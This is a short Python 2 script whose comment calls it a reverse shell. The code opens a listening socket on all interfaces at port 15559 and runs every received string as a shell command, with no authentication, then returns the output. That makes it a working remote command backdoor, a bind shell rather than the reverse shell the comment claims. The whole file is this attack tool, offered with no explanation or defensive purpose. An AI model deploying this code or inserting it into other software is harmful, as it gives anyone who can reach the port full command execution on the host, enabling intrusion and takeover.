#!/usr/bin/python

#This script listens on a port and functions as a reverse shell in python.

import socket
import subprocess

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(("0.0.0.0", 15559))
s.listen(1000)

while True:
	conn, addr = s.accept()
	try:
		while True:
			data = conn.recv(1024)
			proc = subprocess.Popen([data], stdout=subprocess.PIPE, shell=True)
			out = proc.stdout.read()
			conn.sendall(out)
	except:
		print "Whoops"

